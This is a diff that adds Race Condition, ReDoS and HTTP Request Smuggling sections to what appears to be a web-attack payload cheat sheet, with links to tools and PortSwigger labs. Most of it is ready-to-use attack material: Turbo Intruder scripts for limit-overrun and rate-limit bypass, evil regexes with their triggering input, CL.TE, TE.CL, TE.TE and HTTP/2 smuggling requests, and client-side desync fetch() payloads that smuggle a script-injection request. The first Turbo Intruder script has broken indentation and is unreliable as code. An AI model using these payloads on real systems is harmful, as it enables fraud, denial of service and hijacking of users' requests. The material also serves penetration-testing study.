@@ -3656,3 +3656,408 @@ window.location = redirectTo;
 - [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
 - [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
 - [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
+
+----
+
+# Race Condition
+
+> Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.
+
+## Summary
+
+- [Tools](#tools)
+- [Methodology](#methodology)
+    - [Limit-overrun](#limit-overrun)
+    - [Rate-limit Bypass](#rate-limit-bypass)
+- [Techniques](#techniques)
+    - [HTTP/1.1 Last-byte Synchronization](#http11-last-byte-synchronization)
+    - [HTTP/2 Single-packet Attack](#http2-single-packet-attack)
+- [Turbo Intruder](#turbo-intruder)
+    - [Example 1](#example-1)
+    - [Example 2](#example-2)
+- [Labs](#labs)
+- [References](#references)
+
+## Tools
+
+- [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.
+- [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - Make exploiting race conditions in web applications highly efficient and ease-of-use.
+- [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - HTTP/2 Single Packet Attack low Level Library / Tool based on Scapy‌ + Exploit Timing Attacks
+
+## Methodology
+
+### Limit-overrun
+
+Limit-overrun refers to a scenario where multiple threads or processes compete to update or access a shared resource, resulting in the resource exceeding its intended limits.
+
+**Examples**: Overdrawing limit, multiple voting, multiple spending of a giftcard.
+
+- [Race Condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
+- [Race conditions can be used to bypass invitation limit - @franjkovic](https://hackerone.com/reports/115007)
+- [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)
+
+### Rate-limit Bypass
+
+Rate-limit bypass occurs when an attacker exploits the lack of proper synchronization in rate-limiting mechanisms to exceed intended request limits. Rate-limiting is designed to control the frequency of actions (e.g., API requests, login attempts), but race conditions can allow attackers to bypass these restrictions.
+
+**Examples**: Bypassing anti-bruteforce mechanism and 2FA.
+
+- [Instagram Password Reset Mechanism Race Condition - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)
+
+## Techniques
+
+### HTTP/1.1 Last-byte Synchronization
+
+Send every requests except the last byte, then "release" each request by sending the last byte.
+
+Execute a last-byte synchronization using Turbo Intruder
+
+```py
+engine.queue(request, gate='race1')
+engine.queue(request, gate='race1')
+engine.openGate('race1')
+```
+
+**Examples**:
+
+- [Cracking reCAPTCHA, Turbo Intruder style - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)
+
+### HTTP/2 Single-packet Attack
+
+In HTTP/2 you can send multiple HTTP requests concurrently over a single connection. In the single-packet attack around ~20/30 requests will be sent and they will arrive at the same time on the server. Using a single request remove the network jitter.
+
+- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
+- Burp Suite
+    - Send a request to Repeater
+    - Duplicate the request 20 times (CTRL+R)
+    - Create a new group and add all the requests
+    - Send group in parallel (single-packet attack)
+
+**Examples**:
+
+- [CVE-2022-4037 - Discovering a race condition vulnerability in Gitlab with the single-packet attack - James Kettle](https://youtu.be/Y0NVIVucQNE)
+
+## Turbo Intruder
+
+### Example 1
+
+1. Send request to turbo intruder
+2. Use this python code as a payload of the turbo intruder
+
+   ```python
+   def queueRequests(target, wordlists):
+       engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=30,
+                           pipeline=False
+                           )
+
+   for i in range(30):
+       engine.queue(target.req, i)
+           engine.queue(target.req, target.baseInput, gate='race1')
+
+
+       engine.start(timeout=5)
+   engine.openGate('race1')
+
+       engine.complete(timeout=60)
+
+
+   def handleResponse(req, interesting):
+       table.add(req)
+   ```
+
+3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder
+4. Click "Attack"
+
+### Example 2
+
+This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+    request1 = '''
+POST /target-URI-1 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+
+parameterName=parameterValue
+    '''
+
+    request2 = '''
+GET /target-URI-2 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+    '''
+
+    engine.queue(request1, gate='race1')
+    for i in range(30):
+        engine.queue(request2, gate='race1')
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+## Labs
+
+- [PortSwigger - Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
+- [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
+- [PortSwigger - Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
+- [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
+- [PortSwigger - Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
+- [PortSwigger - Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
+- [PortSwigger - Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)
+
+---------
+
+# Regular Expression
+
+> Regular Expression Denial of Service (ReDoS) is a type of attack that exploits the fact that certain regular expressions can take an extremely long time to process, causing applications or services to become unresponsive or crash.
+
+## Summary
+
+* [Tools](#tools)
+* [Methodology](#methodology)
+    * [Evil Regex](#evil-regex)
+    * [Backtrack Limit](#backtrack-limit)
+* [References](#references)
+
+## Tools
+
+* [tjenkinson/redos-detector](https://github.com/tjenkinson/redos-detector) - A CLI and library which tests with certainty if a regex pattern is safe from ReDoS attacks. Supported in the browser, Node and Deno.
+* [doyensec/regexploit](https://github.com/doyensec/regexploit) - Find regular expressions which are vulnerable to ReDoS (Regular Expression Denial of Service)
+* [devina.io/redos-checker](https://devina.io/redos-checker) - Examine regular expressions for potential Denial of Service vulnerabilities
+
+## Methodology
+
+### Evil Regex
+
+Evil Regex contains:
+
+* Grouping with repetition
+* Inside the repeated group:
+    * Repetition
+    * Alternation with overlapping
+
+**Examples**:
+
+* `(a+)+`
+* `([a-zA-Z]+)*`
+* `(a|aa)+`
+* `(a|a?)+`
+* `(.*a){x}` for x \> 10
+
+These regular expressions can be exploited with `aaaaaaaaaaaaaaaaaaaaaaaa!` (20 'a's followed by a '!').
+
+```ps1
+aaaaaaaaaaaaaaaaaaaa! 
+```
+
+For this input, the regex engine will try all possible ways to group the `a` characters before realizing that the match ultimately fails because of the `!`. This results in an explosion of backtracking attempts.
+
+### Backtrack Limit
+
+Backtracking in regular expressions occurs when the regex engine tries to match a pattern and encounters a mismatch. The engine then backtracks to the previous matching position and tries an alternative path to find a match. This process can be repeated many times, especially with complex patterns and large input strings.  
+
+**PHP PCRE configuration options**:
+
+| Name                 | Default | Note |
+|----------------------|---------|---------|
+| pcre.backtrack_limit | 1000000 | 100000 for `PHP < 5.3.7`|
+| pcre.recursion_limit | 100000  | / |
+| pcre.jit             | 1       | / |
+
+Sometimes it is possible to force the regex to exceed more than 100 000 recursions which will cause a ReDOS and make `preg_match` returning false:
+
+```php
+$pattern = '/(a+)+$/';
+$subject = str_repeat('a', 1000) . 'b';
+
+if (preg_match($pattern, $subject)) {
+    echo "Match found";
+} else {
+    echo "No match";
+}
+```
+------
+
+# Request Smuggling
+
+> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.
+
+## Summary
+
+* [Tools](#tools)
+* [Methodology](#methodology)
+    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
+    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
+    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
+    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
+    * [Client-Side Desync](#client-side-desync)
+* [Labs](#labs)
+* [References](#references)
+
+## Tools
+
+* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
+* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
+* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.
+
+## Methodology
+
+If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.
+
+### CL.TE Vulnerabilities
+
+> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
+
+```powershell
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+Example:
+
+```powershell
+POST / HTTP/1.1
+Host: domain.example.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+### TE.CL Vulnerabilities
+
+> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
+
+```powershell
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+Example:
+
+```powershell
+POST / HTTP/1.1
+Host: domain.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
+Content-Length: 4
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0
+
+
+```
+
+:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.
+
+### TE.TE Vulnerabilities
+
+> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
+
+```powershell
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
+```
+
+## HTTP/2 Request Smuggling
+
+HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header
+
+```ps1
+:method GET
+:path /
+:authority www.example.com
+header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
+```
+
+## Client-Side Desync
+
+On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:
+
+```ps1
+POST / HTTP/1.1
+Host: www.example.com
+Content-Length: 37
+
+GET / HTTP/1.1
+Host: www.example.com
+```
+
+could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.
+
+To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:
+
+```javascript
+fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
+```
+
+This could be used to:
+
+* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
+* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
+* to get the victim to run arbitrary JavaScript as if it were from the site
+
+**Example**:
+
+```javascript
+fetch('https://www.example.com/redirect', {
+    method: 'POST',
+        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
+        credentials: 'include',
+        mode: 'cors' // throw an error instead of following redirect
+}).catch(() => {
+        location = 'https://www.example.com/'
+})
+```
+
+This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.
+
+`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
+Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.
+
+## Labs
+
+* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
+* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
+* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
+* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
+
